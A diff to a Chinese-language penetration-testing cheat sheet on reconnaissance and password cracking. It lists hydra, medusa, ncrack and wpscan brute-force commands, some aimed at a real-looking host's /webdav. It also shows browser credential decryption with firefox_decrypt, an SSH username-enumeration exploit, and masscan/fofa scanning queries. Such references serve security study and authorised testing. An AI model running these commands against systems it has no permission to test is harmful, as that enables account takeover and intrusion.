@@ -1,54 +1,6 @@
 信息收集
 ----------------------------------------
 
-系统信息
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `linux系统信息获取LinEnum <https://github.com/rebootuser/LinEnum>`_
-- `系统信息获取PEASS-ng <https://github.com/carlospolop/PEASS-ng>`_
-
-漏洞查询
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- searchsploit
-	+ ``更新：searchsploit -u`` 
-	+ ``下载：searchsploit -m php/webapps/7185.php`` 
-
-存活主机扫描
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- fping
-	+ ``fping -a -g 14.215.177.1 14.215.177.100``
-	+ ``fping -a -g 14.215.177.0/24``
-- masscan
-	+ ``masscan --ping 28.41.0.0/16 --rate 1000000``
-	+ ``心脏出血漏洞：masscan -p443 28.41.0.0/16 --banners --heartbleed``
-	+ ``masscan 192.168.1.1/24 --ports 445`` 
-	+ ``nmap -sP 28.41.0.0/16``
-- nmap
-	+ ``nmap -sP 192.168.0.1/24`` 
-- arp-scan
-	+ ``arp-scan -l`` 
-- netdiscover
-
-IP信息
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- dig
-	+ ``查询A记录：dig baidu.com A +noall +answer``
-	+ ``查询MX记录：dig baidu.com MX +noall +answer``
-	+ ``查询权威DNS：dig baidu.com NS +noall +answer``
-	+ ``查询所有记录：dig baidu.com ANY +noall +answer``
-	+ ``快速回答：+short``
-	+ ``IP反查：dig -x 192.168.17.28 +short``
-	+ ``指定域名服务器：dig baidu.com ANY @8.8.8.8``
-	+ ``解析过程：dig www.ustc.edu.cn +trace``
-	+ ``查询所有子域名：dig @192.168.56.102 greenoptic.vm axfr``
-- nslookup
-	+ ``查询A记录：nslookup -q=A baidu.com``
-	+ ``指定域名服务器：nslookup baidu.com -type=any 8.8.8.8``
-- IP无法访问页面
-	+ 服务器开启虚拟主机
-		``如：www.ustc.edu.cn->218.22.21.21,页面显示400 Unknown Virtual Host``
-	+ 反向代理服务器
-		``如：nginx``
-
 CDN判别
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - 在线多地超级ping
@@ -92,17 +44,94 @@ CDN判别
 - `sslScrape <https://github.com/cheetz/sslScrape/blob/master/sslScrape.py>`_
 - `aquatone <https://github.com/michenriksen/aquatone>`_ A Tool for Domain Flyovers
 
+IP信息
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- dig
+	+ ``查询A记录：dig baidu.com A +noall +answer``
+	+ ``查询MX记录：dig baidu.com MX +noall +answer``
+	+ ``查询权威DNS：dig baidu.com NS +noall +answer``
+	+ ``查询所有记录：dig baidu.com ANY +noall +answer``
+	+ ``快速回答：+short``
+	+ ``IP反查：dig -x 192.168.17.28 +short``
+	+ ``指定域名服务器：dig baidu.com ANY @8.8.8.8``
+	+ ``解析过程：dig www.ustc.edu.cn +trace``
+	+ ``查询所有子域名：dig @192.168.56.102 greenoptic.vm axfr``
+- nslookup
+	+ ``查询A记录：nslookup -q=A baidu.com``
+	+ ``指定域名服务器：nslookup baidu.com -type=any 8.8.8.8``
+- IP无法访问页面
+	+ 服务器开启虚拟主机
+		``如：www.ustc.edu.cn->218.22.21.21,页面显示400 Unknown Virtual Host``
+	+ 反向代理服务器
+		``如：nginx``
+
+存活主机扫描
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- fping
+	+ ``fping -a -g 14.215.177.1 14.215.177.100``
+	+ ``fping -a -g 14.215.177.0/24``
+- masscan
+	+ ``masscan --ping 28.41.0.0/16 --rate 1000000``
+	+ ``心脏出血漏洞：masscan -p443 28.41.0.0/16 --banners --heartbleed``
+	+ ``masscan 192.168.1.1/24 --ports 445`` 
+	+ ``nmap -sP 28.41.0.0/16``
+- nmap
+	+ ``nmap -sP 192.168.0.1/24`` 
+- arp-scan
+	+ ``arp-scan -l`` 
+- netdiscover
+
+系统信息
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `linux系统信息获取LinEnum <https://github.com/rebootuser/LinEnum>`_
+- `系统信息获取PEASS-ng <https://github.com/carlospolop/PEASS-ng>`_
+
+指纹识别
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `Wappalyzer <https://github.com/AliasIO/Wappalyzer>`_
+- `Wordpress Finger Print <https://github.com/iniqua/plecost>`_
+- `CMS指纹识别 <https://github.com/n4xh4ck5/CMSsc4n>`_
+- `JA3 <https://github.com/salesforce/ja3>`_ is a standard for creating SSL client fingerprints in an easy to produce and shareable way
+- `Joomla Vulnerability Scanner <https://github.com/rezasp/joomscan>`_
+- `Drupal enumeration & exploitation tool <https://github.com/immunIT/drupwn>`_
+- wpscan
+	- 插件漏洞:``wpscan --url https://www.xxxxx.wiki/ -e vp`` 
+	- 主题漏洞:``wpscan --url https://www.xxxxxx.wiki -e vt`` 
+	- 枚举用户:``wpscan --url https://www.xxxxxxx.wiki/ -e u`` 
+	- 穷举密码:``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
+- `云悉指纹 <https://www.yunsee.cn/>`_
+- `whatweb <https://github.com/urbanadventurer/whatweb>`_
+- `Webfinger <https://github.com/se55i0n/Webfinger>`_
+- `CMSeek <https://github.com/Tuhinshubhra/CMSeeK>`_
+- `TPscan <https://github.com/Lucifer1993/TPscan>`_ 一键ThinkPHP漏洞检测
+- `TPscan.jar <https://github.com/tangxiaofeng7/TPScan>`_ ThinkPHP漏洞扫描
+- `dedecmscan <https://github.com/lengjibo/dedecmscan>`_ 织梦全版本漏洞扫描
+- `EHole <https://github.com/EdgeSecurityTeam/EHole>`_ 红队重点攻击系统指纹探测工具
+
+漏洞查询
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- searchsploit
+	+ ``更新：searchsploit -u`` 
+	+ ``poc位置：linux/remote/13853.pl``
+	+ ``下载：searchsploit -m php/webapps/7185.php`` 
+	
+firefox缓存破解
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `Firefox_Decrypt <https://github.com/unode/firefox_decrypt>`_
+	+ ``python3 firefox_decrypt.py ../esmhp32w.default-default``
+
 弱密码爆破
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `hydra(九头蛇) <https://github.com/vanhauser-thc/thc-hydra>`_
-	 | ``查看模块用法：hydra -U http-form-post``
-	 | ``smb破解：hydra -l Administrator -P pass.txt smb://192.168.47`` 
-	 | ``3389破解：hydra -l Administrator -P pass.txt rdp://192.168.47.124 -t 1 -V`` 
-	 | ``ssh破解：hydra -l msfadmin -P pass.txt ssh://192.168.47.133 -vV`` 
-	 | ``ftp破解：hydra -L user.txt -P pass.txt ftp://192.168.47.133 -s 21 -e nsr -t 1 -vV`` 
-	 | ``mysql破解：hydra 192.168.43.113 mysql -l root -P /usr/share/wordlists/rockyou.txt -t 1`` 
-	 | ``HTTP服务器身份验证破解：hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
-	 | ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed" -V``
+	+ ``查看模块用法：hydra -U http-form-post``
+	+ ``smb破解：hydra -l Administrator -P pass.txt smb://192.168.47`` 
+	+ ``3389破解：hydra -l Administrator -P pass.txt rdp://192.168.47.124 -t 1 -V`` 
+	+ ``ssh破解：hydra -l msfadmin -P pass.txt ssh://192.168.47.133 -vV`` 
+	+ ``ftp破解：hydra -L user.txt -P pass.txt ftp://192.168.47.133 -s 21 -e nsr -t 1 -vV`` 
+	+ ``mysql破解：hydra 192.168.43.113 mysql -l root -P /usr/share/wordlists/rockyou.txt -t 1`` 
+	+ ``HTTP身份认证破解：hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
+	+ ``HTTP身份认证破解：hydra -l admin -P /usr/share/wordlists/rockyou.txt door.legacyhangtuah.com http-get /webdav``
+	+ ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed" -V``
 
 		::
 		
@@ -119,7 +148,7 @@ CDN判别
 				-V用于显示每次尝试的详细输出 
 				注：此类模块是破解HTTP协议表单数据。
 				
-	| ``hydra -l 用户名 -P password_file 127.0.0.1 http-get-form/http-post-form "vulnerabilities/brute/:username=^USER^&password=^PASS^&submit=login:F=Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=xxxxxxx"``
+	+ ``hydra -l 用户名 -P password_file 127.0.0.1 http-get-form/http-post-form "vulnerabilities/brute/:username=^USER^&password=^PASS^&submit=login:F=Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=xxxxxxx"``
 
 		::
 
@@ -129,11 +158,13 @@ CDN判别
 				第三个参数是判断破解是否成功的标志(F代表错误，S代表正确)；
 				第四个参数是本次请求中的head cookie
 				
+	+ ``-f``：破解了一个密码就停止
+				
 - `medusa(美杜莎) <https://github.com/jmk-foofus/medusa>`_
-	 | ``查询模块用法：medusa -M http -q``
-	 | ``medusa -H ssh1.txt -u root -P passwd.txt -M ssh``
-	 | ``medusa -h 192.168.100.105 -u root -P /home/kali/Downloads/rockyou.txt -M mysql``
-	 | ``medusa -M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``
+	+ ``查询模块用法：medusa -M http -q``
+	+ ``medusa -H ssh1.txt -u root -P passwd.txt -M ssh``
+	+ ``medusa -h 192.168.100.105 -u root -P /home/kali/Downloads/rockyou.txt -M mysql``
+	+ ``medusa -M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``
 
 		::
 		
@@ -144,24 +175,16 @@ CDN判别
 				-e ns 允许我们指定额外的密码检查。 ns 变量允许我们使用用户名作为密码，并且使用空密码。
 				-n 80 允许我们指定端口号码。
 				-F 允许我们在成功找到用户名密码组合之后停止爆破。
-				注：此模块是破解HTTP服务器身份验证。
+				注：此模块是破解HTTP身份认证。
+				medusa -M http -h door.legacyhangtuah.com -m DIR:webdav/ -u admin -P /usr/share/wordlists/rockyou.txt -e ns -n 80 -F
 
-	 | ``medusa -M web-form -q``
-	 
-	 ::
-	 
-			注：此模块是破解HTTP协议表单数据。
-
+	+ HTTP表单破解: ``medusa -M web-form -q``
 - `htpwdScan <https://github.com/lijiejie/htpwdScan>`_
-	 | ``python htpwdScan.py -f dvwa.txt -d password=/usr/share/wordlists/metasploit/unix_users.txt  -err=\"password incorrect\"``
-	 | ``python htpwdScan.py -d passwd=password.txt -u=\"http://xxx.com/index.php?m=login&username=test&passwd=test\" -get -err=\"success\":false\"``
+	+ ``python htpwdScan.py -f dvwa.txt -d password=/usr/share/wordlists/metasploit/unix_users.txt  -err=\"password incorrect\"``
+	+ ``python htpwdScan.py -d passwd=password.txt -u=\"http://xxx.com/index.php?m=login&username=test&passwd=test\" -get -err=\"success\":false\"``
 - `patator <https://github.com/lanjelot/patator>`_
 - ncrack
-	
-	::
-	
-			注：HTTP破解支持的是HTTP服务器身份验证。
-			
+	+ HTTP身份认证破解：``ncrack -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt http://door.legacyhangtuah.com/webdav``
 - fcrackzip
 	| ``fcrackzip -b -l 6-6 -c 1 -p 000000 passwd.zip`` 
 		
@@ -209,6 +232,13 @@ CDN判别
 	+ 破解zip密码
 		| ``zip2john tom.zip>hash5``
 		| ``john hash5 --format=PKZIP --wordlist=/home/kali/Downloads/rockyou.txt``
+		
+- wordpress密码破解
+	- ``auxiliary/scanner/http/wordpress_xmlrpc_login``
+	- ``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
+	- `WPCracker <https://github.com/JoniRinta-Kahila/WPCracker>`_
+		- 枚举用户：``.\WPCracker.exe --enum -u <Url to victims WordPress page> -o <Output file path (OPTIONAL)>``
+		- 暴力破解：``.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username> -o <Output file path (OPTIONAL)>``
 
 路径及文件扫描
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -217,6 +247,9 @@ CDN判别
 	注意在目录探测中，对于关键的目录，需要递归进行扫描。
 	可根据robots.txt中的目录进行扫描。
 
+- dirbuster
+	+ dirbuster -H headless方式启动
+	+ dirbuster ，默认GUI方式启动
 - `dirmap <https://github.com/H4ckForJob/dirmap.git>`_
 	+ ``git clone https://github.com/H4ckForJob/dirmap.git``
 	+ ``python3 -m pip install -r requirement.txt``
@@ -371,6 +404,7 @@ CDN判别
 	+ ``使用代理：nikto -h URL -useproxy http://127.0.0.1:1080`` 
 - `GOBUSTER <https://github.com/OJ/gobuster>`_
 	+ ``目录扫描: gobuster dir -u http://192.168.100.106 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt``
+	+ ``文件扫描：gobuster dir -u http://192.168.100.106 -w /home/kali/Downloads/SecLists/Discovery/Web-Content/directory-list-1.0.txt -x php``
 	+ 批量脚本
 	
 		::
@@ -411,30 +445,6 @@ CDN判别
 路径爬虫
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `crawlergo <https://github.com/0Kee-Team/crawlergo>`_ A powerful dynamic crawler for web vulnerability scanners
-
-指纹识别
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `Wappalyzer <https://github.com/AliasIO/Wappalyzer>`_
-- `Wordpress Finger Print <https://github.com/iniqua/plecost>`_
-- `CMS指纹识别 <https://github.com/n4xh4ck5/CMSsc4n>`_
-- `JA3 <https://github.com/salesforce/ja3>`_ is a standard for creating SSL client fingerprints in an easy to produce and shareable way
-- `Joomla Vulnerability Scanner <https://github.com/rezasp/joomscan>`_
-- `Drupal enumeration & exploitation tool <https://github.com/immunIT/drupwn>`_
-- wpscan
-	- 插件漏洞:``wpscan --url https://www.xxxxx.wiki/ -e vp`` 
-	- 主题漏洞:``wpscan --url https://www.xxxxxx.wiki -e vt`` 
-	- 枚举用户:``wpscan --url https://www.xxxxxxx.wiki/ -e u`` 
-	- 穷举密码:``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
-- `WPCracker <https://github.com/JoniRinta-Kahila/WPCracker>`_
-	- 枚举用户：``.\WPCracker.exe --enum -u <Url to victims WordPress page> -o <Output file path (OPTIONAL)>``
-	- 暴力破解：``.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username> -o <Output file path (OPTIONAL)>``
-- `云悉指纹 <https://www.yunsee.cn/>`_
-- `whatweb <https://github.com/urbanadventurer/whatweb>`_
-- `Webfinger <https://github.com/se55i0n/Webfinger>`_
-- `CMSeek <https://github.com/Tuhinshubhra/CMSeeK>`_
-- `TPscan <https://github.com/Lucifer1993/TPscan>`_ 一键ThinkPHP漏洞检测
-- `TPscan.jar <https://github.com/tangxiaofeng7/TPScan>`_ ThinkPHP漏洞扫描
-- `dedecmscan <https://github.com/lengjibo/dedecmscan>`_ 织梦全版本漏洞扫描
 
 Waf指纹
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -478,6 +488,7 @@ Waf指纹
 		+ smb漏洞：``--script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4`` 
 		+ 查看共享目录:``nmap -p 445 --script smb-ls --script-args 'share=e$,path=\,smbuser=test,smbpass=test' 192.168.137.4``
 		+ ssh破解：``nmap -p22 --script ssh-brute --script-args userdb=cysec_user.txt,passdb=username.txt 172.16.226.5 -nP -vvv``
+		+ 目录扫描:``nmap -sV --script=http-enum -p 80,60000 192.168.100.105``
 	
 	::
 	
@@ -509,12 +520,26 @@ DNS关联
 - `Shodan <https://www.shodan.io/>`_
 - `Zoomeye <https://www.zoomeye.org/>`_
 - `fofa <https://fofa.so/>`_
+	+ title="后台管理" 搜索页面标题中含有“后台管理”关键词的网站和IP
+	+ header="thinkphp" 搜索HTTP响应头中含有“thinkphp”关键词的网站和IP
+	+ body="管理后台" 搜索html正文中含有“管理后台”关键词的网站和IP
+	+ body="Welcome to Burp Suite" 搜索公网上的BurpSuite代理
+	+ domain="itellyou.cn" 搜索根域名中带有“itellyou.cn”的网站
+	+ host="login" 搜索域名中带有"login"关键词的网站
+	+ port="3388" && country=CN 搜索开放3388端口并且位于中国的IP
+	+ ip="120.27.6.1/24" 搜索指定IP或IP段
+	+ cert="phpinfo.me" 搜索证书(如https证书、imaps证书等)中含有"phpinfo.me"关键词的网站和IP
+	+ ports="3306,443,22" 搜索同时开启3306端口、443端口和22端口的IP
+	+ ports=="3306,443,22" 搜索只开启3306端口、443端口和22端口的IP
+	+ && – 表示逻辑与
+	+ || – 表示逻辑或
 - `scans <https://scans.io/>`_
 - `Just Metadata <https://github.com/FortyNorthSecurity/Just-Metadata>`_
 - `publicwww - Find Web Pages via Snippet <https://publicwww.com/>`_
 
 字典
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `SecLists <https://github.com/danielmiessler/SecLists>`_
 - `Blasting dictionary <https://github.com/rootphantomer/Blasting_dictionary>`_
 - `pydictor <https://github.com/LandGrey/pydictor>`_
 - `Probable Wordlists <https://github.com/berzerk0/Probable-Wordlists>`_ Wordlists sorted by probability originally created for password generation and testing
@@ -570,7 +595,7 @@ web破解
 
 	注：其中uid为0标识具有root权限运行的进程。
 	
-FTP用户名枚举
+SSH用户名枚举
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - CVE-2018-15473-Exploit
 	::
@@ -579,5 +604,10 @@ FTP用户名枚举
 		python sshUsernameEnumExploit.py --port 22 --userList /home/kali/Downloads/rockyou.txt 192.168.100.103 
 		
 - auxiliary(scanner/ssh/ssh_enumusers
+
+隐写
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- stegsolve
+	+ 图片隐写分析
 
 .. |pspy| image:: ../images/pspy.jpg
